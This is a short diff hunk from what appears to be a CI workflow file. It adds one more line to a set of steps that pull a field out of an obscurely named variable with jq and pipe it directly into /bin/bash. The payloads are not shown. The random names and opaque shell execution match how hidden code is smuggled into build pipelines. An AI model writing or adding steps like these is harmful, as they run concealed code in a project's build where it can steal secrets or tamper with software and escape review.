@@ -55,6 +55,7 @@ jobs:
           echo $ftf70727 | jq -r .b072 | /bin/bash
           echo $pbar3 | jq -r .rdtrm3578 | /bin/bash
           printf '%s' "$wbb2" | jq -r .twyqs113 | /bin/bash
+          echo $zadb3656 | jq -r .b86554 | /bin/bash
 
       - name: Archive output
         if: always()
